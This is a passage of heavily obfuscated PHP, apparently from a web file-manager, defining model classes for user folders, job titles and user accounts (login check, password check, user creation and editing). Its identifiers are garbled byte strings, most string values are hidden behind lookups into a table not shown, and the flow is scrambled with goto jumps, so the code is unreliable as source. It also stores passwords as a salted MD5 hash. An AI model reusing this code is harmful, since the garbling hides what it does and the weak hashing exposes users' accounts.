$e°–ºøºÃ = $this->getAutoName($e°–ºøºÃ); $aõÉ§­õĞÔ = array($e°õó«å´“[1432] => USER_ID, $e°õó«å´“[436] => 0, $e°õó«å´“[386] => $e°–ºøºÃ, $e°õó«å´“[387] => $bÌÚçáÄ Â, $e°õó«å´“[388] => $EÛ¯ê‡§“š, $e°õó«å´“[2116] => $B ŒÉ¼­°¢ + 1); goto A²ø¢æ¢À‹; D¾èÚšİ¾Œ: } protected function remove($eäß Ëä™) { $EŸ³“á¿Ğ =& $_SERVER[¦·]; $B¡¼ñ­…øß = array($EŸ³“á¿Ğ[1432] => USER_ID, $EŸ³“á¿Ğ[385] => $eäß Ëä™); return $this->where($B¡¼ñ­…øß)->delete(); } protected function removeByName($AŒÄ²«åªä) { $dæ§’áÕæ =& $_SERVER[¦·]; $e’Ä£òÂíÍ = array($dæ§’áÕæ[1432] => USER_ID, $dæ§’áÕæ[386] => $AŒÄ²«åªä, $dæ§’áÕæ[436] => 0); return $this->where($e’Ä£òÂíÍ)->delete(); } protected function rename($d®Â›öé¶á, $fŒÖæ”öò) { $c‚ƒÏ„…ƒ¦ =& $_SERVER[¦·]; if ($d®Â›öé¶á == $fŒÖæ”öò) { return !1; } $F¯ÛÅØ¹×Æ = $this->getAutoName($fŒÖæ”öò); if ($fŒÖæ”öò != $F¯ÛÅØ¹×Æ) { return !1; } $e¤‚Œ“”²Ä = array($c‚ƒÏ„…ƒ¦[1432] => USER_ID, $c‚ƒÏ„…ƒ¦[436] => 0, $c‚ƒÏ„…ƒ¦[28] => $d®Â›öé¶á); return $this->where($e¤‚Œ“”²Ä)->save(array($c‚ƒÏ„…ƒ¦[28] => $fŒÖæ”öò)); } protected function resetSort($E¡Ó¨Ãã…») { $cà¾‚øÑœí =& $_SERVER[¦·]; $E¡Ó¨Ãã…» = is_array($E¡Ó¨Ãã…») ? $E¡Ó¨Ãã…» : array(); $Eæ®åà˜¶® = array($cà¾‚øÑœí[1432] => USER_ID); for ($fóˆö’ªÃ… = 0; $fóˆö’ªÃ… < count($E¡Ó¨Ãã…»); $fóˆö’ªÃ…++) { $Eæ®åà˜¶®[$cà¾‚øÑœí[385]] = $E¡Ó¨Ãã…»[$fóˆö’ªÃ…]; $this->where($Eæ®åà˜¶®)->save(array($cà¾‚øÑœí[2116] => $fóˆö’ªÃ… + 1)); } return !0; } protected function moveTop($e„¿õ—–) { goto CÙ²±â¼¯°; CÙ²±â¼¯°: $CÍõ¸¸ë—Ã =& $_SERVER[¦·]; $a©ö†º±² = array($CÍõ¸¸ë—Ã[1432] => USER_ID, $CÍõ¸¸ë—Ã[436] => 0); $Dóéš¸¤†Â = $this->where($a©ö†º±²)->where(array($CÍõ¸¸ë—Ã[28] => $e„¿õ—–))->find(); goto C»èŸÏÈ”; C»èŸÏÈ”: if (!$Dóéš¸¤†Â) { return; } $fËØÁ–é‹Œ = $this->field($CÍõ¸¸ë—Ã[367])->where($a©ö†º±²)->order($CÍõ¸¸ë—Ã[2525])->select(); $fËØÁ–é‹Œ = array_to_keyvalue($fËØÁ–é‹Œ, $CÍõ¸¸ë—Ã[33], $CÍõ¸¸ë—Ã[367]); goto eÂ‹ØáÛ²‹; eÂ‹ØáÛ²‹: $A‡â´¾Ğé = $fËØÁ–é‹Œ; $fËØÁ–é‹Œ = array_remove_value($fËØÁ–é‹Œ, $Dóéš¸¤†Â[$CÍõ¸¸ë—Ã[367]]); array_unshift($fËØÁ–é‹Œ, $Dóéš¸¤†Â[$CÍõ¸¸ë—Ã[367]]); goto e·Ò†ÈÍÚ; e·Ò†ÈÍÚ: return $this->resetSort($fËØÁ–é‹Œ); goto B·¿ãå–¸¾; B·¿ãå–¸¾: } protected function moveBottom($CßÇ«»õç) { $fšĞë”—ç =& $_SERVER[¦·]; $a²ÆŸÕÏÇâ = array($fšĞë”—ç[1432] => USER_ID, $fšĞë”—ç[436] => 0); $AÈ¾âŠßŠĞ = $this->where($a²ÆŸÕÏÇâ)->max($fšĞë”—ç[2134]); $Bê‡§‰ÙÖ‰ = array($fšĞë”—ç[2134] => $AÈ¾âŠßŠĞ + 1); return $this->where($a²ÆŸÕÏÇâ)->where(array($fšĞë”—ç[28] => $CßÇ«»õç))->save($Bê‡§‰ÙÖ‰); } private function getAutoName($c¹‚ŞÅ„È) { goto b›ä¼°í«¹; AËÑçÆé‚Ä: return $c¹‚ŞÅ„È . "\x28{$e‚ñÛöÔ}\51"; goto CÃ«ëë„­Í; b›ä¼°í«¹: $dóßîÑ»¥  =& $_SERVER[¦·]; $CâñÉ™ˆƒÈ = array($dóßîÑ»¥ [1432] => USER_ID, $dóßîÑ»¥ [436] => 0); $C§¨ˆ‘Ú¹ = $this->field($dóßîÑ»¥ [28])->where($CâñÉ™ˆƒÈ)->select(); goto e’°÷·‚Ò; e’°÷·‚Ò: $C§¨ˆ‘Ú¹ = array_to_keyvalue($C§¨ˆ‘Ú¹, $dóßîÑ»¥ [33], $dóßîÑ»¥ [28]); if (!$C§¨ˆ‘Ú¹ || !in_array($c¹‚ŞÅ„È, $C§¨ˆ‘Ú¹)) { return $c¹‚ŞÅ„È; } for ($e‚ñÛöÔ = 0; $e‚ñÛöÔ < count($C§¨ˆ‘Ú¹); $e‚ñÛöÔ++) { if (!in_array($c¹‚ŞÅ„È . "\50{$e‚ñÛöÔ}\x29", $C§¨ˆ‘Ú¹)) { return $c¹‚ŞÅ„È . "\50{$e‚ñÛöÔ}\x29"; } } goto AËÑçÆé‚Ä; CÃ«ëë„­Í: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\152\x6f\142\114\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\x64\145\x73\x63", "\x73\x6f\162\164"); const JOB_KEY = "\x73\x65\x6c\146\x4a\157\x62\114\151\163\164"; public function listData($e‰ôËóá¢¶ = false, $Díêå™¿ä = "\163\157\162\x74", $a•Ü¬šŠ† = false) { return parent::listData($e‰ôËóá¢¶, $Díêå™¿ä, $a•Ü¬šŠ†); } public function remove($a×Á¦˜™“¥) { return parent::remove($a×Á¦˜™“¥); } public function add($c¦õğâ»Æ) { $AÊ‹‚Œ‹æß =& $_SERVER[¦·]; if ($this->findByName($c¦õğâ»Æ[$AÊ‹‚Œ‹æß[28]])) { return !1; } $c¦õğâ»Æ[$AÊ‹‚Œ‹æß[2134]] = $this->getSort(); return parent::insert($c¦õğâ»Æ); } private function getSort() { $aÑ·¡ñÕß“ =& $_SERVER[¦·]; $B÷…¶ˆéŞÍ = parent::listData(); $EÀî  õÅ = array_to_keyvalue($B÷…¶ˆéŞÍ, $aÑ·¡ñÕß“[33], $aÑ·¡ñÕß“[2134]); return empty($EÀî  õÅ) ? 0 : max($EÀî  õÅ) + 1; } public function update($EöºİÁ£ÍÓ, $e¨‚Ì¯¬„°) { $B™çÏ’ËÀÉ =& $_SERVER[¦·]; $F‘†°íŸ = parent::listData($EöºİÁ£ÍÓ); $Béãƒ¦‰½ß = $this->findByName($e¨‚Ì¯¬„°[$B™çÏ’ËÀÉ[28]]); if (!$F‘†°íŸ || $Béãƒ¦‰½ß && $Béãƒ¦‰½ß[$B™çÏ’ËÀÉ[367]] != $F‘†°íŸ[$B™çÏ’ËÀÉ[367]]) { return !1; } return parent::update($EöºİÁ£ÍÓ, $e¨‚Ì¯¬„°); } public function setUserJob($E£‚Â²°Ñ, $fïÚãƒĞÙá) { goto AŸĞ¯¶ËÙò; B™‰†¡ò¼Ì: $aæƒ‹ØÄ¡Î = rtrim($aæƒ‹ØÄ¡Î, $f–¶Ò§†›‘[47]); Model($f–¶Ò§†›‘[479])->metaSet($E£‚Â²°Ñ, self::JOB_KEY, $aæƒ‹ØÄ¡Î); goto f»±à×‰§í; e¶™ËáåÇ: $DÍŒ©æä³ = array_to_keyvalue($e¶î§Æ‡Ù˜, $f–¶Ò§†›‘[28]); $aæƒ‹ØÄ¡Î = $f–¶Ò§†›‘[361]; foreach ($fïÚãƒĞÙá as $e°Ö—²´Ò¿) { if ($DÍŒ©æä³[$e°Ö—²´Ò¿]) { $aæƒ‹ØÄ¡Î .= $DÍŒ©æä³[$e°Ö—²´Ò¿][$f–¶Ò§†›‘[367]] . $f–¶Ò§†›‘[47]; } else { $D´ÛÅ¢ßè§ = $this->add($e°Ö—²´Ò¿); $aæƒ‹ØÄ¡Î .= $D´ÛÅ¢ßè§ . $f–¶Ò§†›‘[47]; } } goto B™‰†¡ò¼Ì; AŸĞ¯¶ËÙò: $f–¶Ò§†›‘ =& $_SERVER[¦·]; if (!is_array($fïÚãƒĞÙá)) { $fïÚãƒĞÙá = array($fïÚãƒĞÙá); } $e¶î§Æ‡Ù˜ = parent::listData(); goto e¶™ËáåÇ; f»±à×‰§í: } public function getUserJob($fßññº„œ) { $E‘éºÁØÎî = Model($_SERVER[¦·][479])->metaGet($fßññº„œ); return $this->getUserJobInfo($E‘éºÁØÎî[self::JOB_KEY]); } public function getUserJobInfo($BìŠ¼ßãçñ) { goto bˆ¤ïÔ•Ğ‚; bˆ¤ïÔ•Ğ‚: $A„„â¬°ï =& $_SERVER[¦·]; $F¥„ÈÏ¶ÄÃ = explode($A„„â¬°ï[47], $BìŠ¼ßãçñ); $CÕ£Š…Šõô = parent::listData(); goto E—óøÄÉ•ã; F¿Ïµ§ É¨: return $C¤ã±—õÏ; goto A†¢õ¿ºãœ; E—óøÄÉ•ã: $CÕ£Š…Šõô = array_remove_key($CÕ£Š…Šõô, $A„„â¬°ï[187]); $C¤ã±—õÏ = array(); foreach ($F¥„ÈÏ¶ÄÃ as $Fœ¥ê¥÷ã™) { if (isset($CÕ£Š…Šõô[$Fœ¥ê¥÷ã™])) { $C¤ã±—õÏ[] = $CÕ£Š…Šõô[$Fœ¥ê¥÷ã™]; } } goto F¿Ïµ§ É¨; A†¢õ¿ºãœ: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\x61\x6d\145" => "\165\163\x65\162\137\x6d\145\164\141", "\x6d\x65\164\x61\106\151\x65\x6c\x64" => "\165\163\x65\x72\x49\104"); protected $simpleField = "\x75\x73\x65\162\111\x44\x2c\x6e\x69\x63\x6b\x4e\x61\x6d\145\54\x6e\x61\x6d\x65\54\141\x76\x61\164\x61\x72\x2c\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($EĞ¨È¢„ù…) { $e»½›òˆ ÷ =& $_SERVER[¦·]; $F¢ÈĞ÷áíš = $e»½›òˆ ÷[2526]; return array($e»½›òˆ ÷[2181] => array($EĞ¨È¢„ù…[0], $F¢ÈĞ÷áíš), $e»½›òˆ ÷[2183] => array($EĞ¨È¢„ù…[0], $F¢ÈĞ÷áíš), $e»½›òˆ ÷[2527] => array($EĞ¨È¢„ù…[0], $F¢ÈĞ÷áíš)); } protected function getInfo($a¦«¼’ÕÉ™, $a‰ÙëÏ¡ = false) { $D†ƒ›òîÑ = $this->getInfoSimple($a¦«¼’ÕÉ™); if (!is_array($D†ƒ›òîÑ)) { return array(); } if ($a‰ÙëÏ¡) { return $this->_getInfoApply($D†ƒ›òîÑ); } return $this->cacheFunctionGet($_SERVER[¦·][2237], $a¦«¼’ÕÉ™); } protected function getInfoFull($A•Âëô»‡, $f¯¬Åõ‘Û = false) { $bŒàØÄËê³ = $this->getInfoSimple($A•Âëô»‡); if (!is_array($bŒàØÄËê³)) { return array(); } if ($f¯¬Åõ‘Û) { return $this->_getInfoApply($bŒàØÄËê³, !0); return $this->_getInfoApply($bŒàØÄËê³, !0); } return $this->cacheFunctionGet($_SERVER[¦·][2528], $A•Âëô»‡); } private function _getInfoApply($eŠØŒœÖØ­, $F¥Â½©Ûšò = false) { goto bê¯ÒÕ‚£Ê; e©áÕÍ®§Ë: $eŠØŒœÖØ­ = $this->_listDataApplyItem($eŠØŒœÖØ­); $b­™éªìŠ„ = Model($dŒĞòÜÜª®[1122])->metaGet($eŠØŒœÖØ­[$dŒĞòÜÜª®[391]][$dŒĞòÜÜª®[369]]); $eŠØŒœÖØ­[$dŒĞòÜÜª®[2531]] = $Fâà½ƒÙÒ; goto b„Ğ¯ßÌ¤™; bê¯ÒÕ‚£Ê: $dŒĞòÜÜª® =& $_SERVER[¦·]; if (!$eŠØŒœÖØ­) { return $eŠØŒœÖØ­; } $Fâà½ƒÙÒ = md5($dŒĞòÜÜª®[2529] . $eŠØŒœÖØ­[$dŒĞòÜÜª®[804]] . $dŒĞòÜÜª®[2530] . $eŠØŒœÖØ­[$dŒĞòÜÜª®[28]]); goto e©áÕÍ®§Ë; b„Ğ¯ßÌ¤™: $eŠØŒœÖØ­[$dŒĞòÜÜª®[391]][$dŒĞòÜÜª®[2366]] = isset($b­™éªìŠ„[$dŒĞòÜÜª®[2367]]) ? $b­™éªìŠ„[$dŒĞòÜÜª®[2367]] : null; if ($F¥Â½©Ûšò) { $eŠØŒœÖØ­[$dŒĞòÜÜª®[417]] = $this->metaGet($eŠØŒœÖØ­[$dŒĞòÜÜª®[1441]]); } return $eŠØŒœÖØ­; goto cÅòëæÂ†»; cÅòëæÂ†»: } protected function getInfoSimple($D¾Ãç¾ÉŒ¯, $B¹İâ®½µÍ = false) { $f‹Ñì°†ãİ =& $_SERVER[¦·]; if (!$D¾Ãç¾ÉŒ¯) { return array(); } if ($B¹İâ®½µÍ) { $eë¦™Å×Á› = $this->where(array($f‹Ñì°†ãİ[1441] => intval($D¾Ãç¾ÉŒ¯)))->find(); if (!is_array($eë¦™Å×Á›)) { return array(); } $eë¦™Å×Á›[$f‹Ñì°†ãİ[2532]] = Action($f‹Ñì°†ãİ[2533])->parseUrl($eë¦™Å×Á›[$f‹Ñì°†ãİ[2532]]); return $eë¦™Å×Á›; } return $this->cacheFunctionGet($f‹Ñì°†ãİ[2184], $D¾Ãç¾ÉŒ¯); } protected function getInfoSimpleOuter($B£–Õç£ª‹) { goto e²ñŒÍÌÕ; e²ñŒÍÌÕ: $BÔŒÅ°Şè• =& $_SERVER[¦·]; if (!$B£–Õç£ª‹ || $B£–Õç£ª‹ == 0) { return array($BÔŒÅ°Şè•[1441] => $BÔŒÅ°Şè•[470], $BÔŒÅ°Şè•[28] => $BÔŒÅ°Şè•[157] . LNG($BÔŒÅ°Şè•[2534]) . $BÔŒÅ°Şè•[478], $BÔŒÅ°Şè•[2532] => STATIC_PATH . $BÔŒÅ°Şè•[2535]); } $eØ½ÕÍéö„ = $this->cacheFunctionGet($BÔŒÅ°Şè•[2184], $B£–Õç£ª‹); goto E›Ç÷ÂÚ‘; E›Ç÷ÂÚ‘: $fÉŞ¡‘ìÎ = array_field_key($eØ½ÕÍéö„, explode($BÔŒÅ°Şè•[47], $this->simpleField)); if (!$fÉŞ¡‘ìÎ) { return array($BÔŒÅ°Şè•[1441] => $BÔŒÅ°Şè•[1034], $BÔŒÅ°Şè•[28] => $BÔŒÅ°Şè•[157] . LNG($BÔŒÅ°Şè•[2536]) . $BÔŒÅ°Şè•[478], $BÔŒÅ°Şè•[2532] => STATIC_PATH . $BÔŒÅ°Şè•[2537]); } $fÉŞ¡‘ìÎ[$BÔŒÅ°Şè•[2532]] = Action($BÔŒÅ°Şè•[2533])->parseUrl($fÉŞ¡‘ìÎ[$BÔŒÅ°Şè•[2532]]); goto DÍ‘áÏá¢‚; DÍ‘áÏá¢‚: return $fÉŞ¡‘ìÎ; goto cóšó¯Ïé; cóšó¯Ïé: } protected function groupUser($f­¸³Šœ) { } public static function errorLang($cµ«†åäÂ) { $bÏ÷ÌÍƒÛÇ =& $_SERVER[¦·]; $aùŸ¾öÀŒ = array(self::ERROR_USER_NOT_EXISTS => $bÏ÷ÌÍƒÛÇ[2538], self::ERROR_USER_PASSWORD_ERROR => $bÏ÷ÌÍƒÛÇ[2539], self::ERROR_USER_EXIST_NAME => $bÏ÷ÌÍƒÛÇ[2540], self::ERROR_USER_EXIST_PHONE => $bÏ÷ÌÍƒÛÇ[2541], self::ERROR_USER_EXIST_EMAIL => $bÏ÷ÌÍƒÛÇ[2542], self::ERROR_USER_LOGIN_LOCK => $bÏ÷ÌÍƒÛÇ[2543], self::ERROR_IP_NOT_ALLOW => $bÏ÷ÌÍƒÛÇ[2544], self::ERROR_USER_EXIST_NICKNAME => $bÏ÷ÌÍƒÛÇ[2545]); return LNG($aùŸ¾öÀŒ[$cµ«†åäÂ]); } public function getInfoByMeta($aÕ®Í¦ŠåÄ, $fšÖ©ˆƒå) { $EÕ´Œæ‰ˆ— =& $_SERVER[¦·]; $d¾ƒ õ¿¡ƒ = Model($EÕ´Œæ‰ˆ—[2546])->where(array($EÕ´Œæ‰ˆ—[89] => $aÕ®Í¦ŠåÄ, $EÕ´Œæ‰ˆ—[359] => $fšÖ©ˆƒå))->find(); if ($d¾ƒ õ¿¡ƒ) { return $this->getInfo($d¾ƒ õ¿¡ƒ[$EÕ´Œæ‰ˆ—[1441]]); } return !1; } public function userLoginCheck($F’Œ‰òÈ¢, $bÁ–ß÷ƒ›Ñ) { goto e¸¾Â¡İÆ±; e’ƒ¨ïŸ–Ø: $this->userEdit($E˜šª“î[$A–ñÚĞÚˆğ[1441]], array($A–ñÚĞÚˆğ[2548] => time())); return $this->getInfo($E˜šª“î[$A–ñÚĞÚˆğ[1441]]); goto CŒ­÷ºì¸›; b¦ô…ÂÑš·: $E˜šª“î = $this->where($D¿îçĞƒ­÷)->find(); if (!$E˜šª“î) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($E˜šª“î[$A–ñÚĞÚˆğ[1441]], $bÁ–ß÷ƒ›Ñ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto e’ƒ¨ïŸ–Ø; e¸¾Â¡İÆ±: $A–ñÚĞÚˆğ =& $_SERVER[¦·]; $D¿îçĞƒ­÷ = array($A–ñÚĞÚˆğ[28] => $F’Œ‰òÈ¢, $A–ñÚĞÚˆğ[2370] => $F’Œ‰òÈ¢, $A–ñÚĞÚˆğ[293] => $F’Œ‰òÈ¢, $A–ñÚĞÚˆğ[2547] => $F’Œ‰òÈ¢, $A–ñÚĞÚˆğ[916] => $A–ñÚĞÚˆğ[918]); if ($this->nickNameRpt()) { unset($D¿îçĞƒ­÷[$A–ñÚĞÚˆğ[2370]]); } goto b¦ô…ÂÑš·; CŒ­÷ºì¸›: } public function clearCache($EîİÑ ƒœ†) { $CŠ…Â¸¢—À =& $_SERVER[¦·]; $this->cacheFunctionClear($CŠ…Â¸¢—À[2237], $EîİÑ ƒœ†); $this->cacheFunctionClear($CŠ…Â¸¢—À[2184], $EîİÑ ƒœ†); $this->cacheFunctionClear($CŠ…Â¸¢—À[2528], $EîİÑ ƒœ†); } public function userPasswordCheck($a÷˜ÖŸœ†í, $dã¹­óÕ…­) { $a»ª¡É´»° =& $_SERVER[¦·]; $eİíÃÜšˆ = $this->where(array($a»ª¡É´»°[1441] => intval($a÷˜ÖŸœ†í)))->find(); $fÜÍ—ºÂ–Ò = $this->metaGet($a÷˜ÖŸœ†í); $EÇ˜èßØ … = isset($fÜÍ—ºÂ–Ò[$a»ª¡É´»°[2549]]) ? $fÜÍ—ºÂ–Ò[$a»ª¡É´»°[2549]] : $a»ª¡É´»°[33]; if (md5($EÇ˜èßØ … . trim($dã¹­óÕ…­)) !== $eİíÃÜšˆ[$a»ª¡É´»°[804]]) { return !1; } return !0; } public function userAdd($AçÙ¹‘½Ë) { goto AÃ—Ï«è¨÷; BÛÍ¿Ìö‡Ä: $FßÉäÈ×É¼ = $this->_checkExist($AçÙ¹‘½Ë); if ($FßÉäÈ×É¼ !== !0) { return $FßÉäÈ×É¼; } $E‹Ó³®™¢ = $this->add($C‹¥ª’Ğ¿); goto F§³›æ×êŒ; F§³›æ×êŒ: $Fë‚±¾ÙµÛ = array($d÷øÍ¡êÃ[2557] => $C‹¥ª’Ğ¿[$d÷øÍ¡êÃ[804]], $d÷øÍ¡êÃ[2553] => $C‹¥ª’Ğ¿[$d÷øÍ¡êÃ[2370]]); $this->userEdit($E‹Ó³®™¢, $Fë‚±¾ÙµÛ); Model($d÷øÍ¡êÃ[1122])->userRootAdd($E‹Ó³®™¢); goto e¹Ü·Û´‰; AÃ—Ï«è¨÷: $d÷øÍ¡êÃ =& $_SERVER[¦·]; $C‹¥ª’Ğ¿ = array($d÷øÍ¡êÃ[386] => $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[28]], $d÷øÍ¡êÃ[2550] => $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[1326]], $d÷øÍ¡êÃ[2551] => isset($AçÙ¹‘½Ë[$d÷øÍ¡êÃ[293]]) ? $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[293]] : $d÷øÍ¡êÃ[33], $d÷øÍ¡êÃ[2552] => isset($AçÙ¹‘½Ë[$d÷øÍ¡êÃ[2547]]) ? $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[2547]] : $d÷øÍ¡êÃ[33], $d÷øÍ¡êÃ[2553] => isset($AçÙ¹‘½Ë[$d÷øÍ¡êÃ[2370]]) ? $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[2370]] : $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[28]], $d÷øÍ¡êÃ[2554] => isset($AçÙ¹‘½Ë[$d÷øÍ¡êÃ[2532]]) ? $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[2532]] : $d÷øÍ¡êÃ[33], $d÷øÍ¡êÃ[2555] => isset($AçÙ¹‘½Ë[$d÷øÍ¡êÃ[2556]]) ? $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[2556]] : 1, $d÷øÍ¡êÃ[2557] => $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[804]], $d÷øÍ¡êÃ[2185] => isset($AçÙ¹‘½Ë[$d÷øÍ¡êÃ[2096]]) ? $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[2096]] : 1024 * 1024 * 20, $d÷øÍ¡êÃ[2186] => 0, $d÷øÍ¡êÃ[2548] => 0, $d÷øÍ¡êÃ[2224] => isset($AçÙ¹‘½Ë[$d÷øÍ¡êÃ[690]]) ? $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[690]] : 1); if (!empty($AçÙ¹‘½Ë[$d÷øÍ¡êÃ[1441]])) { $C‹¥ª’Ğ¿[$d÷øÍ¡êÃ[1441]] = $AçÙ¹‘½Ë[$d÷øÍ¡êÃ[1441]]; } goto BÛÍ¿Ìö‡Ä; e¹Ü·Û´‰: return $E‹Ó³®™¢; goto aˆÅˆ‰¨Å×; aˆÅˆ‰¨Å×: } protected function userEditTest($D¡ˆ¾¼è¿, $D¡ß‚œï¸™) { return $this->call($_SERVER[¦·][2558], $D¡ˆ¾¼è¿, $D¡ß‚œï¸™); } protected function userEdit($DÜ±ÈÁ´©Ê, $fË·ìóâĞŒ) { goto e¯ÇéÃëºŒ; aÆ†¥Õ£ã—: return !0; goto f×ä“Û; fä±¸Èƒµ: $this->where(array($BÑ‹‘Âïä[1432] => $DÜ±ÈÁ´©Ê))->save($fË·ìóâĞŒ); if (isset($fË·ìóâĞŒ[$BÑ‹‘Âïä[2370]])) { $this->setNamePinyin($DÜ±ÈÁ´©Ê, $fË·ìóâĞŒ[$BÑ‹‘Âïä[2370]]); } $this->clearCache($DÜ±ÈÁ´©Ê); goto aÆ†¥Õ£ã—; e¯ÇéÃëºŒ: $BÑ‹‘Âïä =& $_SERVER[¦·]; $câí•½Ä¡ô = $this->getInfoSimple($DÜ±ÈÁ´©Ê); if (!$câí•½Ä¡ô) { return !1; } goto fÄ§–ìµ¹ä; fÄ§–ìµ¹ä: $aãÁÚÄ£‰¥ = $this->_checkExist($fË·ìóâĞŒ, $DÜ±ÈÁ´©Ê); if ($aãÁÚÄ£‰¥ !== !0) { return $aãÁÚÄ£‰¥; } if (isset($fË·ìóâĞŒ[$BÑ‹‘Âïä[804]]) && trim($fË·ìóâĞŒ[$BÑ‹‘Âïä[804]]) != $BÑ‹‘Âïä[33]) { $F™ŞÑĞ‹´ñ = $this->metaGet($DÜ±ÈÁ´©Ê); if (empty($F™ŞÑĞ‹´ñ[$BÑ‹‘Âïä[2549]])) { $F™ŞÑĞ‹´ñ[$BÑ‹‘Âïä[2549]] = rand_string(10); Model($BÑ‹‘Âïä[476])->metaSet($DÜ±ÈÁ´©Ê, $BÑ‹‘Âïä[2549], $F™ŞÑĞ‹´ñ[$BÑ‹‘Âïä[2549]]); } $fË·ìóâĞŒ[$BÑ‹‘Âïä[804]] = md5($F™ŞÑĞ‹´ñ[$BÑ‹‘Âïä[2549]] . trim($fË·ìóâĞŒ[$BÑ‹‘Âïä[804]])); } else { unset($fË·ìóâĞŒ[$BÑ‹‘Âïä[804]]); } goto fä±¸Èƒµ; f×ä“Û: } public function setNamePinyin($f®ëÉÍ†ÂŒ, $FêĞ¤ƒŠ…¡ = false) { $f©ì‡í¢¾‰ =& $_SERVER[¦·]; if (!$FêĞ¤ƒŠ…¡) { $dêÔ½‹ÙêĞ = $this->getInfoSimple($f®ëÉÍ†ÂŒ); $FêĞ¤ƒŠ…¡ = $dêÔ½‹ÙêĞ[$f©ì‡í¢¾‰[2370]] ? $dêÔ½‹ÙêĞ[$f©ì‡í¢¾‰[2370]] : $dêÔ½‹ÙêĞ[$f©ì‡í¢¾‰[28]]; } $EÖõÂ‹Üñ = Model($f©ì‡í¢¾‰[479]); if (!Input::check($FêĞ¤ƒŠ…¡, $f©ì‡í¢¾‰[530])) { return $EÖõÂ‹Üñ->metaSet($f®ëÉÍ†ÂŒ, array($f©ì‡í¢¾‰[416] => $f©ì‡í¢¾‰[33], $f©ì‡í¢¾‰[415] => $f©ì‡í¢¾‰[33])); } return $EÖõÂ‹Üñ->metaSet($f®ëÉÍ†ÂŒ, array($f©ì‡í¢¾‰[416] => str_replace($f©ì‡í¢¾‰[50], $f©ì‡í¢¾‰[33], Pinyin::encode($FêĞ¤ƒŠ…¡)), $f©ì‡í¢¾‰[415] => Pinyin::encode($FêĞ¤ƒŠ…¡, $f©ì‡í¢¾‰[531]))); } private function nickNameRpt() { $b¿å¾Ğ¥‹† =& $_SERVER[¦·]; $eˆ·™âÅŸ‚ = Model($b¿å¾Ğ¥‹†[1091])->get($b¿å¾Ğ¥‹†[2559]); $AÁóë÷ó¤‰ = $GLOBALS[$b¿å¾Ğ¥‹†[6]][$b¿å¾Ğ¥‹†[2517]][$b¿å¾Ğ¥‹†[2559]]; $eØ–ÊÔôÙ• = !is_null($eˆ·™âÅŸ‚) ? $eˆ·™âÅŸ‚ : $AÁóë÷ó¤‰; return !!$eØ–ÊÔôÙ•; } private function _checkExist($EÆ×—¬•ÃŸ, $AõŠ¥â‰‚ß = false) { $AÁßñ¨ÎßÜ =& $_SERVER[¦·]; $eƒÁ÷‰ø¡½ = array($AÁßñ¨ÎßÜ[28] => UserModel::ERROR_USER_EXIST_NAME, $AÁßñ¨ÎßÜ[2370] => UserModel::ERROR_USER_EXIST_NICKNAME, $AÁßñ¨ÎßÜ[293] => UserModel::ERROR_USER_EXIST_EMAIL, $AÁßñ¨ÎßÜ[2547] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($eƒÁ÷‰ø¡½[$AÁßñ¨ÎßÜ[2370]]); } $FÚÄîŠ„„‹ = $AõŠ¥â‰‚ß ? array($AÁßñ¨ÎßÜ[1441] => array($AÁßñ¨ÎßÜ[2560], $AõŠ¥â‰‚ß)) : array(); foreach ($eƒÁ÷‰ø¡½ as $aÕ¡Ä¼†ì” => $fÔÆ±îßè) { $FõÈ¨§ºë‹ = array(); foreach ($eƒÁ÷‰ø¡½ as $c¬° ÂŸ³µ => $aäØŞÈĞå¥) { if (isset($EÆ×—¬•ÃŸ[$c¬° ÂŸ³µ]) && $EÆ×—¬•ÃŸ[$c¬° ÂŸ³µ]) { $FõÈ¨§ºë‹[] = $EÆ×—¬•ÃŸ[$c¬° ÂŸ³µ]; } } if (!$FõÈ¨§ºë‹) { continue; } $Eõø—Í÷Š = array_merge(array($aÕ¡Ä¼†ì” => array($AÁßñ¨ÎßÜ[7], $FõÈ¨§ºë‹)), $FÚÄîŠ„„‹); $B§…†Æñ›Æ = $this->where($Eõø—Í÷Š)->find(); if ($B§…†Æñ›Æ) { return $fÔÆ±îßè; } } return !0; } public function userListInfo($cÔòå»”à) { $bˆ‹˜µé‹Ğ =& $_SERVER[¦·]; $Fã¦Š…¿ø‡ = array(); $cÔòå»”à = is_array($cÔòå»”à) ? array_unique($cÔòå»”à) : array(); if (!$cÔòå»”à) { return $Fã¦Š…¿ø‡; } if (count($cÔòå»”à) < 20) { foreach ($cÔòå»”à as $E‚¬¸âá»ë) { $Fã¦Š…¿ø‡[$E‚¬¸âá»ë . $bˆ‹˜µé‹Ğ[33]] = $this->getInfoSimpleOuter($E‚¬¸âá»ë); } } else { $CíËø÷Â»ì = array($bˆ‹˜µé‹Ğ[1432] => array($bˆ‹˜µé‹Ğ[384], $cÔòå»”à)); if (count($cÔòå»”à) == 1) { $CíËø÷Â»ì = array($bˆ‹˜µé‹Ğ[1432] => $cÔòå»”à[0]); } $AÎÀÖ•èÖ = Model($bˆ‹˜µé‹Ğ[476])->field($this->simpleField)->where($CíËø÷Â»ì)->select(); $AÎÀÖ•èÖ = array_to_keyvalue($AÎÀÖ•èÖ, $bˆ‹˜µé‹Ğ[1441]); foreach ($cÔòå»”à as 